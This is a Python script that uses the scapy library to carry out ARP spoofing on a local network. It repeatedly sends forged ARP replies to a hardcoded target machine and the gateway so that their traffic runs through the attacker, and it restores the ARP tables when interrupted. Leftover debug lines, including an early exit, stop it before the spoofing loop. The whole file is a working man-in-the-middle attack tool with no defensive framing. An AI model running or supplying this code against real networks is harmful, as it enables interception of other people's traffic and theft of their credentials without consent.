#!/usr/bin/env python3
import sys
import time
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # print(ip)
    answered_list, unanswered = scapy.srp(arp_request_broadcast, timeout=3, verbose=True)
    # print(unanswered)
    # print(answered_list)
    # exit(1)
    # answered_list = answered_list[0]

    # for ans in answered_list:
    #     print(ans[0][scapy.ARP].hwsrc)
    #     print(ans[0][scapy.ARP].op)
    #     # print(ans[1].show())
    #     print(ans[1][scapy.ARP].hwsrc)
    #     print(ans[1][scapy.ARP].op)
    #     # print(ans)

    #     print("--------")
    # print("###############################################")
    # print("###############################################")
    answer = [answer for answer in answered_list if answer[1].op == 2][0]
    # print(answer)
    # print(ans.show())
    return answer[1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# target_ip = "192.168.178.27"
target_ip = "192.168.178.33"
gateway_ip = "192.168.178.1"


print(get_mac(gateway_ip))
exit(1)

try:
    packets_sent_count = 0
    while True:
        spoof(gateway_ip, target_ip)
        spoof(target_ip, gateway_ip)
        packets_sent_count = packets_sent_count + 2
        print("\r[+] Sent " + str(packets_sent_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables..... please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
